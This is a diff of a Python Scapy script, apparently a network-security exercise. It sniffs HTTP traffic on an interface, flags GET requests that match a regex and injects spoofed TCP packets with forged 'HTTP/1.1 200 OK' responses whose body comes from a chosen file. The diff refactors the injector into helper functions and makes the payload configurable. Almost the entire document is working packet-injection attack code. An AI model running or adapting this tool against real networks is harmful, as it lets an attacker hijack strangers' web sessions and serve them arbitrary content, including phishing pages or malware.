@@ -7,10 +7,10 @@ import re
 from time import *
 
 parser = argparse.ArgumentParser(description='idk')
-parser.add_argument("--interface", help="interface")
-parser.add_argument("--regexp", help="regular expression")
-parser.add_argument("--datafile", help="datafile input")
-parser.add_argument("expression", help="straight up input")
+parser.add_argument("-i", "--interface", default="en0", help="Network interface to listen on")
+parser.add_argument("-r", "--regexp", help="A regular expression that will be used to flag packets")
+parser.add_argument("-d", "--datafile", help="Used as the TCP Raw payload for the injected packet(s)")
+parser.add_argument("expression", default="tcp and port 80", help="A filter for packet sniffing (eg 'tcp and port 80' for HTTP-only)")
 
 args = parser.parse_args()
 # print args
@@ -46,26 +46,21 @@ def determine_bad_packet(packet):
             print packet[TCP][Raw].load
             inject_packet(packet)
 
-# Given a flagged packet, injects a packet
-def inject_packet (flagged_packet):
-    #to_inject = flagged_packet
-    #print "flagged " + flagged_packet.summary()
-    #http_headers = "HTTP / 1.1 400 Bad Request\r\nDate: Sun, 18 Oct 2012 10:36:20 GMT\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Length: 230\r\nContent-Type: text/html; charset=iso-8859-1\r\n\Connection: Closed\r\n\r\n"
-    #http_content="<html><head><title>400 Bad Request</title></head><body><h1>Bad Request</h1><p>Your browser sent a request that this server could not understand.</p><p>The request line contained invalid characters following the protocol string.</p></body></html>"
-    time = strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
-    header_template = "HTTP/1.1 200 OK\r\nDate: " + time + "\r\nServer: Apache\r\nCache-Control: public, max-age=300\r\nConnection: close\r\nContent-type: text/html\r\n\r\n"
+#helper function to send the packet
+def send_packet (to_inject):
+    # Use some magic to prep the packet for sending
+    to_inject = to_inject.__class__(str(to_inject))
+    sendp(to_inject)
 
-    content_template = "<html><title>Hi!</title><body><div><h1>YOYOYOYOYOYOYOYOY</h1></div></body></html>"
-
-    http_reponse = header_template + content_template
-
-    #http_headers = 'GET / HTTP/1.1\r\nHost: www.sex.com\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n'
-    to_inject = Ether()/IP()/TCP()/http_reponse #args.datafile
+#helper function to form the packet's key properties
+def form_packet (payload, flagged_packet):
+    to_inject = Ether()/IP()/TCP()/payload
+    print payload
     #Ether fields
     to_inject[Ether].src = flagged_packet[Ether].dst
     to_inject[Ether].dst = flagged_packet[Ether].src
     # IP fields
-    to_inject[IP].src = flagged_packet[IP].dst #"192.168.1.1"
+    to_inject[IP].src = flagged_packet[IP].dst
     to_inject[IP].dst = flagged_packet[IP].src
     to_inject[IP].id = flagged_packet[IP].id + 112
     # TCP fields
@@ -84,11 +79,31 @@ def inject_packet (flagged_packet):
 
     to_inject[TCP].flags = "PA"
     del to_inject.chksum
-    to_inject = to_inject.__class__(str(to_inject))
-    sendp(to_inject)
+    send_packet(to_inject)
+
+# Helper function to read the datafile
+def read_datafile (flagged_packet):
+    with open(args.datafile, 'r') as datafile:
+        time = strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
+        header_template = "HTTP/1.1 200 OK\r\nDate: " + time + "\r\nServer: Apache\r\nCache-Control: public, max-age=300\r\nConnection: close\r\nContent-type: text/html\r\n\r\n"
+        http_reponse = header_template + datafile.read()
+        form_packet(http_reponse, flagged_packet)
+
+# Given a flagged packet, injects a packet
+# This function is essentially a wrapper for a bunch of helpers that call themselves sequentially
+def inject_packet (flagged_packet):
+    #to_inject = flagged_packet
+    #print "flagged " + flagged_packet.summary()
+    #http_headers = "HTTP / 1.1 400 Bad Request\r\nDate: Sun, 18 Oct 2012 10:36:20 GMT\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Length: 230\r\nContent-Type: text/html; charset=iso-8859-1\r\n\Connection: Closed\r\n\r\n"
+    #http_content="<html><head><title>400 Bad Request</title></head><body><h1>Bad Request</h1><p>Your browser sent a request that this server could not understand.</p><p>The request line contained invalid characters following the protocol string.</p></body></html>"
+    read_datafile(flagged_packet)
+
+
+
+
 
 # sniff the given interface for tcp packets
-packets = sniff(iface=args.interface, filter="tcp and port 80", lfilter=lambda p: "GET" in str(p),
+packets = sniff(iface=args.interface, filter=args.expression, lfilter=lambda p: "GET" in str(p),
     prn=determine_bad_packet)
 
 # must check each packet individually
